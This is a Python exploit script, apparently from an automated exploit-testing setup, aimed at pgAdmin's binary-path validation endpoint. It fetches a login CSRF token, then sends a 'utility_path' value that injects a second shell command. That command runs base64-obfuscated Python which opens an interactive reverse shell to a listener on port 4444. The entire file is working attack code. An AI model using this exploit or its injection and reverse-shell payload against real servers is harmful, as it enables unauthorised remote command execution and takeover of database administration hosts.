#!/usr/bin/env python3
"""Trigger pgAdmin binary path command execution and launch a shell."""

import base64
import http.cookiejar
import json
import os
import re
import urllib.error
import urllib.request


def login_csrf_token(opener: urllib.request.OpenerDirector, target: str) -> str:
    response = opener.open(f"{target}/login", timeout=30)
    html = response.read().decode("utf-8", errors="replace")
    match = re.search(
        r"name=[\"']csrf_token[\"'][^>]*value=[\"']([^\"']+)", html,
    )
    if match is None:
        raise RuntimeError("login page has no CSRF token")
    return match.group(1)


def shell_payload() -> str:
    code = (
        "import os,socket;"
        "sock=socket.socket();"
        "sock.connect(('127.0.0.1',4444));"
        "[os.dup2(sock.fileno(),fd) for fd in (0,1,2)];"
        "os.execl('/bin/sh','sh','-i')"
    )
    encoded = base64.b64encode(code.encode()).decode()
    return f'a";python3 -c \'import base64;exec(base64.b64decode("{encoded}"))\';#'


def trigger_exploit(target: str) -> int:
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()),
    )
    token = login_csrf_token(opener, target)
    request = urllib.request.Request(
        f"{target}/misc/validate_binary_path",
        data=json.dumps({"utility_path": shell_payload()}).encode(),
        headers={
            "Content-Type": "application/json",
            "X-CSRFToken": token,
            "X-pgA-CSRFToken": token,
        },
        method="POST",
    )
    try:
        response = opener.open(request, timeout=60)
    except urllib.error.HTTPError as error:
        response = error
    body = response.read().decode("utf-8", errors="replace")
    print(f"binary path response {response.status}: {body[:200]}", flush=True)
    return response.status


def main() -> None:
    target = os.environ["REMOTE_TARGET_URL"].rstrip("/")
    status = trigger_exploit(target)
    if status != 200:
        raise RuntimeError(f"binary path endpoint returned HTTP {status}")
    print(json.dumps({"evidence_payload": {}}))


if __name__ == "__main__":
    main()
